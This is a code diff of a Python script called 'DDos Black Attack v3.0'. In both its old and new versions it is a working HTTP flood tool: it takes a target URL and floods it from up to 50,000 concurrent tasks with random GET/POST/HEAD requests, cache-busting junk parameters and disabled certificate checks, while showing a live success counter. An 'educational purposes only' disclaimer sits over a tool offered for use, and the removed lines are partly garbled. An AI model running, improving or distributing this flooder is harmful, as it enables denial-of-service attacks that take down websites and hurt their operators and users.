@@ -1,93 +1,107 @@
-Developer: Safwan Al-Sadaf
+# DDos Black Attack v3.0
+# Developer: Safwan Al-Sadaf
+# Date: 2025-06-17
+# Description: Educational HTTP Flooder Tool with 50,000 threads and live counter
+# Disclaimer: This tool is created for educational and testing purposes only.
+# The developer is not responsible for any misuse of this script.
 
-Tool Type: Real HTTP Flooder (VPN Required)
+import asyncio
+import random
+import ssl
+import sys
+import os
+from aiohttp import ClientSession, TCPConnector
+from urllib.parse import urlparse, quote
 
-Disclaimer: This tool is for educational purposes only. Developer holds no responsibility for any misuse.
+class DDosBlackAttack:
+    def __init__(self):
+        self.target_url = ""
+        self.host_ip = ""
+        self.threads = 50000
+        self.running = True
+        self.methods = ['GET', 'POST', 'HEAD']
+        self.ssl_ctx = self.create_ssl_context()
+        self.success = 0
+        self.failed = 0
 
-import asyncio import random import ssl import sys import os import time from aiohttp import ClientSession, TCPConnector from urllib.parse import urlparse, quote
+    def create_ssl_context(self):
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        return ctx
 
-class DDosBlackAttack: def init(self): self.target_url = "" self.host_ip = "" self.threads = 50000 self.users = 5000 self.running = True self.success = 0 self.failed = 0 self.methods = ['GET', 'POST', 'HEAD'] self.ssl_ctx = self.create_ssl_context()
+    def clear_screen(self):
+        os.system('clear' if os.name != 'nt' else 'cls')
 
-def create_ssl_context(self):
-    ctx = ssl.create_default_context()
-    ctx.check_hostname = False
-    ctx.verify_mode = ssl.CERT_NONE
-    return ctx
+    def show_banner(self):
+        self.clear_screen()
+        print(r"""
+ ____         __                     
+/ ___|  __ _ / _|_      ____ _ _ __  
+\___ \ / _` | |_\ \ /\ / / _` | '_ \ 
+ ___) | (_| |  _|\ V  V / (_| | | | |
+|____/ \__,_|_|   \_/\_/ \__,_|_| |_|
 
-def clear_screen(self):
-    os.system('clear' if os.name != 'nt' else 'cls')
+        DDos Black Attack v3.0
+        Developer: Safwan Al-Sadaf
+        Mode: Random HTTP Flood (GET/POST/HEAD)
+        Threads: 50,000
+---------------------------------------------------
+"Use responsibly. Only on permitted websites."
+---------------------------------------------------
+""")
 
-def show_banner(self):
-    self.clear_screen()
-    print("""
+    def setup(self):
+        self.show_banner()
+        self.target_url = input("[+] Enter target website URL (https://example.com): ").strip()
+        self.host_ip = input("[+] Enter target host IP address: ").strip()
 
+    def generate_junk(self):
+        return quote(f"_={random.randint(10000, 999999)}&data={random.random()}")
 
----
+    def generate_headers(self):
+        return {
+            "Host": urlparse(self.target_url).netloc,
+            "User-Agent": f"Mozilla/5.0 (DDosBlackAttack/{random.randint(1000,9999)})",
+            "Accept": "*/*",
+            "Connection": "keep-alive"
+        }
 
-/ |  __ _ / |      ____ _ _ __
-_ \ /  | |_\ \ /\ / / _ | ' \ ) | (| |  |\ V  V / (| | | | | |/ _,||   _/_/ _,|| ||
+    async def http_flood(self, session, method):
+        while self.running:
+            try:
+                url = f"{self.target_url}?{self.generate_junk()}"
+                async with session.request(method=method, url=url, ssl=self.ssl_ctx, timeout=10) as response:
+                    await response.read()
+                    self.success += 1
+            except:
+                self.failed += 1
 
-🔥 DDos Black Attack v3.0 🛠️  Developer : Safwan Al-Sadaf 🛠️  Threads   : 50000 🧑‍💻 Users     : 5000 ⚠️  VPN Required 📅  2025-06-17 """) print(""" 📜 Disclaimer: This tool is for educational purposes only. 📛 Developer is not responsible for any misuse. 💣 Quote: "When SQLi strikes silently, databases scream without a sound." """)
+    async def attack_loop(self):
+        connector = TCPConnector(ssl=self.ssl_ctx, limit=self.threads)
+        tasks = []
+        async with ClientSession(connector=connector, headers=self.generate_headers()) as session:
+            for _ in range(self.threads):
+                method = random.choice(self.methods)
+                tasks.append(self.http_flood(session, method))
+            stat_task = asyncio.create_task(self.show_stats())
+            await asyncio.gather(*tasks, stat_task)
 
-def setup(self):
-    self.show_banner()
-    self.target_url = input("[+] Enter target website URL: ").strip()
-    self.host_ip = input("[+] Enter target host IP address: ").strip()
+    async def show_stats(self):
+        while self.running:
+            await asyncio.sleep(1)
+            print(f"[+] Sent: {self.success} | Failed: {self.failed}", end='\r')
 
-def generate_junk(self):
-    return '&'.join([f'r{random.randint(1,99999)}={random.random()}' for _ in range(5)])
-
-def generate_headers(self):
-    ua_list = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-        'Mozilla/5.0 (X11; Linux x86_64)',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)',
-        'Mozilla/5.0 (Linux; Android 10; SM-A105F)',
-    ]
-    return {
-        'User-Agent': random.choice(ua_list),
-        'Accept': '*/*',
-        'Connection': 'keep-alive',
-        'Referer': 'https://google.com'
-    }
-
-async def http_flood(self, session, method):
-    while self.running:
+    def run(self):
+        self.setup()
+        print("\n[✓] Attack Started! Live stats below... (Ctrl+C to stop)\n")
         try:
-            if method == 'POST':
-                async with session.post(self.target_url, data=self.generate_junk()) as resp:
-                    await resp.read()
-            else:
-                async with session.request(method, f"{self.target_url}?{self.generate_junk()}") as resp:
-                    await resp.read()
-            self.success += 1
-        except:
-            self.failed += 1
+            asyncio.run(self.attack_loop())
+        except KeyboardInterrupt:
+            self.running = False
+            print("\n[!] Attack Stopped by user.")
+        print("\n[✓] Attack Finished ✅")
 
-async def live_stats(self):
-    while self.running:
-        print(f"\r[+] Sent: {self.success} | Failed: {self.failed}", end="")
-        await asyncio.sleep(1)
-
-async def attack_loop(self):
-    connector = TCPConnector(ssl=self.ssl_ctx, limit=0)
-    tasks = []
-    async with ClientSession(connector=connector) as session:
-        for _ in range(self.users):
-            method = random.choice(self.methods)
-            tasks.append(self.http_flood(session, method))
-        tasks.append(self.live_stats())
-        await asyncio.gather(*tasks)
-
-def run(self):
-    self.setup()
-    print("\n[✓] Attack Started! Live stats below... (Ctrl+C to stop)\n")
-    try:
-        asyncio.run(self.attack_loop())
-    except KeyboardInterrupt:
-        self.running = False
-        print("\n[!] Attack stopped by user.")
-    print("\n[✓] Attack finished.")
-
-if name == "main": tool = DDosBlackAttack() tool.run()
+if __name__ == "__main__":
+    tool = DDosBlackAttack()
+    tool.run()
